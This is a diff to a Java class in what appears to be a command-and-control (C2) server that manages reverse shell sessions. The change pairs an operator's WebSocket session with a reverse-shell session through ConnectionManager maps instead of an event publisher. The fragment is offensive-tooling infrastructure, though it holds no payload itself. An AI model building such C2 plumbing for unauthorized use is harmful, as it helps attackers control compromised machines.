@@ -5,6 +5,7 @@ import com.mtattab.c2cServer.model.MessageEventModel;
 import com.mtattab.c2cServer.service.Command;
 import com.mtattab.c2cServer.service.ReverseShellManagerService;
 import com.mtattab.c2cServer.service.observable.ActiveSessionsObservable;
+import com.mtattab.c2cServer.util.ConnectionManager;
 import com.mtattab.c2cServer.util.DataManipulationUtil;
 import com.mtattab.c2cServer.util.SocketUtil;
 import lombok.extern.slf4j.Slf4j;
@@ -21,7 +22,6 @@ import java.util.Map;
 import java.util.Optional;
 import org.springframework.context.ApplicationEventPublisherAware;
 
-import static com.mtattab.c2cServer.model.enums.ActiveSessionsEvents.MANAGER_TO_REVERSE_SHELL_CONNECTION;
 
 
 @Component
@@ -51,13 +51,19 @@ public class ConnectCommand implements Command,  ApplicationEventPublisherAware 
 
     private void connectToSession(WebSocketSession currentSocket, WebSocketSession socketToConnectTo){
 //        establish connection between two manger socket and reverse shell socket
-        this.applicationEventPublisher.publishEvent(
-                new MessageEventModel(this, MANAGER_TO_REVERSE_SHELL_CONNECTION, currentSocket,socketToConnectTo));
+//        this.applicationEventPublisher.publishEvent(
+//                new MessageEventModel(this, MANAGER_TO_REVERSE_SHELL_CONNECTION, currentSocket,socketToConnectTo));
 
+        ConnectionManager.connectedManagerToReverseSessions.put(currentSocket,socketToConnectTo);
+        ConnectionManager.connectedReverseToManagerSessions.put(socketToConnectTo, currentSocket);
+
+        // send a conformation to socket current socket
         SocketUtil.sendMessage(currentSocket, new TextMessage(DataManipulationUtil.convertObjectToJson(ManagerCommunicationModel.builder()
                 .msg(String.format("Connected successfuly to socket: '%s'",socketToConnectTo.getId()))
                 .build()
         )));
+
+
     }
 
     @Override
